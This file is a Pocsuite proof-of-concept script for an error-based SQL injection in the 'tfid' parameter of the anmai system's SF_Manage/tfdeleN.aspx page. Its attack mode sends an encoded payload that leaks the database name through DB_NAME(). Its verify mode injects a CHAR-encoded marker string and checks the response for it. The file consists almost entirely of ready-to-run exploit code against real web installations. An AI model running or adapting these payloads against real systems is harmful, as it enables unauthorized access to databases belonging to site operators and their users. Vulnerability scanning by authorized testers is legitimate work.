#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'anmai /anmai/SF_Mange/tfdeleN.aspx sql injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=106896']
    desc = '''anmai anmai/SF_Manage/tfdeleN.aspx  的 tfid 参数报错注入'''

    vulDate = '2015-04-13'
    createDate = '2019-04-11'
    updateDate = '2019-04-11'

    appName = 'anmai'
    appVersion = '正式版'
    appPowerLink = 'http://www.anmai.net/'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/anmai/SF_Manage/tfdeleN.aspx"
        payload = "?tfid=%28SELECT%20%20CHAR%28126%29%2bDB_NAME%28%29%2bCHAR%28126%29%29"
        url = self.url + payload
        resp = s.get(url)
        dbname = re.search('~(.*?)~', resp.content)
        if dbname:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname.group(1)
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/anmai/SF_Manage/tfdeleN.aspx"
        payload = "?tfid=%28SELECT%20%20CHAR%28115%29%2bCHAR%28104%29%2bCHAR%28117%29%2bCHAR%2890%29%2bCHAR%2873%29%2bCHAR%28103%29%2bCHAR%28117%29%2bCHAR%2897%29%2bCHAR%28110%29%2bCHAR%2888%29%2bCHAR%2873%29%2bCHAR%2878%29%2bCHAR%2871%29%29"
        url = self.url + payload
        resp = s.get(url)
        if 'shuZIguanXING' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

